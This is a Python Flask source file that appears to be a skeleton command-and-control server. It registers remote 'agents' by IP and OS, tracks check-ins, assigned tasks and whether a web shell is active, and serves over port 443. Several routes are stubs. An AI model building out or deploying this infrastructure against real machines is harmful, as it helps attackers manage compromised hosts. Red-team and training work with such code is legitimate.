
# app.py
import os
import time
import uuid
import json
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
from flask_sqlalchemy import SQLAlchemy
from dotenv import load_dotenv
from pathlib import Path

# Load environment variables
env_path = Path('.') / '.env'
load_dotenv(dotenv_path=env_path)

app = Flask(__name__)

# Configure MySQL
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('MYSQL_URI', 'mysql://user:password@localhost/c2db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Define Models
class Task(db.Model):
    __tablename__ = 'tasks'
    
    id = db.Column(db.Integer, primary_key=True)
    task_id = db.Column(db.String(36), unique=True, nullable=False)
    description = db.Column(db.String(255), nullable=False)
    status = db.Column(db.String(50), nullable=False)
    assigned_at = db.Column(db.BigInteger, nullable=False)
    agent_id = db.Column(db.Integer, db.ForeignKey('agents.id'), nullable=False)

class Agent(db.Model):
    __tablename__ = 'agents'
    
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(36), unique=True, nullable=False)
    ip_address = db.Column(db.String(50), nullable=False)
    last_checkin = db.Column(db.BigInteger, nullable=False)
    status = db.Column(db.String(50), nullable=False)
    os = db.Column(db.String(50), nullable=True)
    os_version = db.Column(db.String(50), nullable=True)
    web_shell_active = db.Column(db.Boolean, default=False)
    
    # Relationship with Task model
    tasks = db.relationship('Task', backref='agent', lazy=True)

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/displayagents', methods=['GET'])
def display_agents():
    agents = Agent.query.all()
    result = []
    
    for agent in agents:
        agent_data = {
            'ID': agent.uuid,
            'IPAddress': agent.ip_address,
            'LastCheckin': agent.last_checkin,
            'Status': agent.status,
            'Os': agent.os,
            'OsVersion': agent.os_version,
            'WebShellActive': agent.web_shell_active,
            'Tasks': []
        }
        
        for task in agent.tasks:
            task_data = {
                'TaskID': task.task_id,
                'Description': task.description,
                'Status': task.status,
                'AssignedAt': task.assigned_at
            }
            agent_data['Tasks'].append(task_data)
            
        result.append(agent_data)
    
    return jsonify(result)

@app.route('/checkin', methods=['POST'])
def checkin_handler():
    # Implement checkin functionality
    return jsonify({"status": "success"})

@app.route('/deviceinfo', methods=['POST'])
def get_device_info():
    # Gets client's IP, OS, and OS version and stores it in the database
    if request.method == 'POST':
        data = request.json
        
        agent_uuid = data.get('uuid', str(uuid.uuid4()))
        ip_address = request.remote_addr
        os_name = data.get('os', '')
        os_version = data.get('os_version', '')
        
        # Check if agent exists
        agent = Agent.query.filter_by(uuid=agent_uuid).first()
        
        if agent:
            # Update existing agent
            agent.ip_address = ip_address
            agent.last_checkin = int(time.time())
            agent.os = os_name
            agent.os_version = os_version
        else:
            # Create new agent
            agent = Agent(
                uuid=agent_uuid,
                ip_address=ip_address,
                last_checkin=int(time.time()),
                status="Active",
                os=os_name,
                os_version=os_version,
                web_shell_active=False
            )
            db.session.add(agent)
        
        db.session.commit()
        
        return jsonify({"status": "success", "agent_id": agent_uuid})
    
    return jsonify({"status": "error", "message": "Method not allowed"}), 405

@app.route('/searchdevices', methods=['GET'])
def search_devices():
    # Implement search functionality
    return jsonify({"status": "not implemented"})

@app.route('/status', methods=['POST'])
def declare_status():
    # Checks if listener is still active on device
    if request.method == 'POST':
        data = request.json
        agent_uuid = data.get('uuid')
        
        if not agent_uuid:
            return jsonify({"status": "error", "message": "UUID required"}), 400
        
        agent = Agent.query.filter_by(uuid=agent_uuid).first()
        
        if agent:
            agent.last_checkin = int(time.time())
            agent.status = data.get('status', agent.status)
            db.session.commit()
            return jsonify({"status": "success"})
        
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    return jsonify({"status": "error", "message": "Method not allowed"}), 405

def setup_database():
    with app.app_context():
        # Create tables
        db.create_all()
        
        # Check if we need to add a test agent
        if Agent.query.count() == 0:
            # Add a test agent
            test_agent = Agent(
                uuid=str(uuid.uuid4()),
                ip_address="192.168.23.14",
                last_checkin=int(time.time()),
                status="Active",
                os="Windows 10",
                os_version="10.3.5",
                web_shell_active=False
            )
            db.session.add(test_agent)
            db.session.commit()
            
            # Add a test task for this agent
            test_task = Task(
                task_id="001",
                description="Vuln Scan",
                status="In Progress",
                assigned_at=int(time.time()),
                agent_id=test_agent.id
            )
            db.session.add(test_task)
            db.session.commit()
            
            print("Test agent and task created successfully")

if __name__ == '__main__':
    setup_database()
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
